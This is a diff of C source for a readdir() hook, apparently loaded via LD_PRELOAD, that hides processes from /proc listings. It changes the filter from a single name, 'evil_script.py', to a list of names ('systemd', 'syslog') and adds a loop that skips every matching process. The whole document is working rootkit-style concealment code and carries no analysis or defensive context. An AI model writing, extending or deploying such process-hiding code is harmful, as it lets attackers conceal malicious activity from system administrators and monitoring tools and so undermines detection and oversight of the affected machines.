@@ -9,8 +9,7 @@
 /*
  * Every process with this name will be excluded
  */
-static const char* process_to_filter = "evil_script.py";
-
+static const char* process_to_filter[] = {"systemd", "syslog"};
 /*
  * Get a directory name given a DIR* handle
  */
@@ -75,18 +74,27 @@ struct dirent* readdir(DIR *dirp)                                       \
     }                                                                   \
                                                                         \
     struct dirent* dir;                                                 \
+    char dir_name[256];                                                 \
+    char process_name[256];                                             \
+    int i;                                                              \
                                                                         \
     while(1)                                                            \
     {                                                                   \
         dir = original_##readdir(dirp);                                 \
         if(dir) {                                                       \
-            char dir_name[256];                                         \
-            char process_name[256];                                     \
             if(get_dir_name(dirp, dir_name, sizeof(dir_name)) &&        \
                 strcmp(dir_name, "/proc") == 0 &&                       \
-                get_process_name(dir->d_name, process_name) &&          \
-                strcmp(process_name, process_to_filter) == 0) {         \
-                continue;                                               \
+                get_process_name(dir->d_name, process_name)) {          \
+                int exclude_process = 0;                                \
+                for (i = 0; i < sizeof(process_to_filter) / sizeof(process_to_filter[0]); i++) { \
+                    if (strcmp(process_name, process_to_filter[i]) == 0) { \
+                        exclude_process = 1;                            \
+                        break;                                          \
+                    }                                                   \
+                }                                                       \
+                if (exclude_process) {                                  \
+                    continue;                                           \
+                }                                                       \
             }                                                           \
         }                                                               \
         break;                                                          \
